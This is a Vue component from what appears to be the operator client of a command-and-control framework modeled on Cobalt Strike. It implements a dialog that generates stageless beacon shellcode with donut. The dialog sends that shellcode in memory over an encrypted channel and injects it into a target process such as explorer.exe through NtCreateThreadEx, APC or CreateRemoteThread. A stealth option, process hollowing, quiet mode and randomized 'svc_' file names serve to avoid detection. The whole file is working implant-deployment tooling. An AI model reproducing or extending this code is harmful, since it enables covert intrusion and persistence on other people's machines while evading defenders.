<template>
  <el-dialog
    v-model="visible"
    :title="isZh ? '注入迁移（进程上线）' : 'Process Migration (Inject)'"
    width="500px"
    :close-on-click-modal="false"
    append-to-body
    class="cs-dialog"
  >
    <div class="cs-dialog-body cs-font-ui">
      <div class="cs-dialog-desc">
        {{ isZh ? '生成无阶段 shellcode（完整 beacon 经 donut），经加密命令通道直接下发内存注入指定进程——全程不落盘，新会话以该进程身份上线（如 explorer.exe）。' : 'Generates stageless shellcode (full beacon via donut), dispatched in-memory through the encrypted command channel — never touches disk. The new session comes online as that process (e.g. explorer.exe).' }}
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '监听器:' : 'Listener:' }}</label>
        <el-select v-model="form.listener" size="small" class="cs-form-input" :placeholder="isZh ? '选择监听器' : 'Select listener'" @visible-change="onDropdown">
          <el-option v-for="l in listenerOptions" :key="l.name" :label="l.name" :value="l.name" />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '目标系统:' : 'Target OS:' }}</label>
        <el-select v-model="form.os" size="small" class="cs-form-input">
          <el-option label="Windows" value="windows" />
          <el-option label="Linux" value="linux" />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '上线密码:' : 'Pass:' }}</label>
        <el-input v-model="form.pass" size="small" class="cs-form-input" :placeholder="isZh ? '可选；不设则无参数启动更隐蔽' : 'Optional; empty = parameter-less launch' " />
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '注入技术:' : 'Technique:' }}</label>
        <el-select v-model="form.tech" size="small" class="cs-form-input">
          <el-option :label="isZh ? 'auto（隐蔽链，推荐）' : 'auto (stealth chain, recommended)'" value="auto" />
          <el-option label="NtCreateThreadEx" value="ntc" />
          <el-option label="QueueUserAPC" value="apc" />
          <el-option label="CreateRemoteThread" value="crt" />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '目标 PID:' : 'Target PID:' }}</label>
        <el-input v-model="form.pid" size="small" class="cs-form-input" placeholder="explorer.exe 的 PID（进程面板可查）" />
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer-center">
        <button class="cs-btn cs-btn-primary" :disabled="busy || !form.listener || !form.pid" @click="handleMigrate">
          {{ busy ? (isZh ? '生成并注入中...' : 'Injecting...') : (isZh ? '生成并注入' : 'Generate & Inject') }}
        </button>
        <button class="cs-btn" @click="close">{{ isZh ? '关闭' : 'Close' }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ElMessage } from 'element-plus'
import { useWorkspaceStore } from '@/stores/workspace'
import { useI18nStore } from '@/stores/i18n'
import ClientAPI from '@/api/clients'
import { fetchListenerOptions, generateClientBinaryBlob, type ListenerOption } from './Payloads/payloadUtil'

const workspace = useWorkspaceStore()
const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const visible = computed({
  get: () => workspace.dialogs.migrate.visible,
  set: (v) => {
    if (!v) workspace.closeDialog('migrate')
  },
})

// 打开时从调用方预填 PID（进程面板选中进程直接带入）
watch(
  () => workspace.dialogs.migrate.visible,
  (val) => {
    if (val) {
      form.pid = workspace.dialogs.migrate.pid || ''
    }
  },
)

const listenerOptions = ref<ListenerOption[]>([])
const busy = ref(false)

const form = reactive({
  listener: '',
  os: 'windows',
  pass: '',
  tech: 'auto',
  pid: '',
})

async function onDropdown(visibleState?: boolean) {
  if (visibleState === false) return
  if (!listenerOptions.value.length) {
    listenerOptions.value = await fetchListenerOptions()
  }
}

function close() {
  workspace.closeDialog('migrate')
}

async function handleMigrate() {
  const uid = workspace.dialogs.migrate?.uid || workspace.primarySelectedUid || ''
  if (!uid) {
    ElMessage.warning(isZh.value ? '未指定执行会话' : 'No session selected')
    return
  }
  const pid = form.pid.trim()
  if (!pid) {
    ElMessage.warning(isZh.value ? '请输入目标 PID' : 'Enter target PID')
    return
  }
  const opt = listenerOptions.value.find((l) => l.name === form.listener)
  busy.value = true
  try {
    if (!form.listener) {
      // 一键迁移: 服务端按会话监听器配置自动重建 beacon→donut→注入(tech 默认 apc)→原进程延迟退出
      await ClientAPI.migrate({ uid, pid: parseInt(pid, 10), tech: form.tech || 'apc' })
      ElMessage.success(isZh.value ? '迁移已下发: 新会话将以目标进程身份上线, 原会话稍后退出' : 'Migration dispatched; new session will come online as the target process, old session exits shortly')
    } else {
      // 手动指定监听器: 走前端编排(生成无阶段载荷 + 内存注入, 原进程保留)
      const blob = await generateClientBinaryBlob({
        listener: form.listener,
        osType: form.os,
        archType: form.os === 'windows' ? 'amd64' : 'amd64',
        pass: '', // 注入载荷强制无口令：反射加载无命令行参数，带口令会因 ExecuteKey 校验失败退出
        format: 'exe', // 进程镂空: 完整 beacon PE 由客户端以新进程加载(hollow), 可靠上线
        vkey: opt?.vkey || undefined,
        encryptSalt: opt?.encryptSalt || undefined,
        quietMode: '1',
      })
      if (!blob) {
        ElMessage.error(isZh.value ? '生成失败' : 'Generation failed')
        return
      }
      // 2. 经加密命令通道内存下发（不落盘）并注入
      const rand = Math.random().toString(36).slice(2, 8)
      const fname = `svc_${rand}.bin`
      const file = new File([blob], fname, { type: 'application/octet-stream' })
      await ClientAPI.inject_mem({ uid, pid, tech: form.tech || 'auto', file })
      ElMessage.success(isZh.value ? '已内存下发并注入，新会话将以目标进程身份上线（结果见交互控制台）' : 'Shellcode dispatched in-memory and injected; new session will come online as the target process (see Interact console)')
    }
    // 打开控制台看结果
    workspace.openTab({ id: `beacon:${uid}`, title: `beacon: ${uid.slice(0, 8)}`, component: 'beacon', params: { uid } })
    close()
  } catch (e: any) {
    ElMessage.error(isZh.value ? '注入迁移失败: ' + (e?.message || e) : 'Migration failed: ' + (e?.message || e))
  } finally {
    busy.value = false
  }
}
</script>

<style scoped>
.cs-dialog-body {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.cs-dialog-desc {
  font-size: 12px;
  color: var(--cs-text-dim);
  line-height: 1.4;
}
.cs-form-row {
  display: flex;
  align-items: center;
  gap: 10px;
}
.cs-form-label {
  width: 82px;
  font-size: 12px;
  color: var(--cs-text);
  flex-shrink: 0;
}
.cs-form-input {
  flex: 1;
}
.cs-dialog-footer-center {
  display: flex;
  justify-content: center;
  gap: 8px;
}
</style>
